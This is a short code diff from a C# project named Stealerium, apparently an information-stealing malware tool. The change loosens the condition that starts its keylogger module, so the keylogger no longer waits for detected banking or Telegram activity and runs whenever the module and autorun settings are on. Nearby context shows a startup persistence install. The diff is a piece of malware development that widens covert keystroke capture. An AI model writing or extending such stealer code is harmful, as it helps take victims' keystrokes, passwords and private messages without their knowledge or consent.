@@ -67,7 +67,7 @@ namespace Stealerium
                     Startup.Install();
 
             // Run keylogger module
-            if (Config.KeyloggerModule == "1" && (Counter.BankingServices || Counter.Telegram) && Config.Autorun == "1")
+            if (Config.KeyloggerModule == "1" && Config.Autorun == "1")
             {
                 Logging.Log("Starting keylogger modules...");
                 wThread = WindowManager.MainThread;
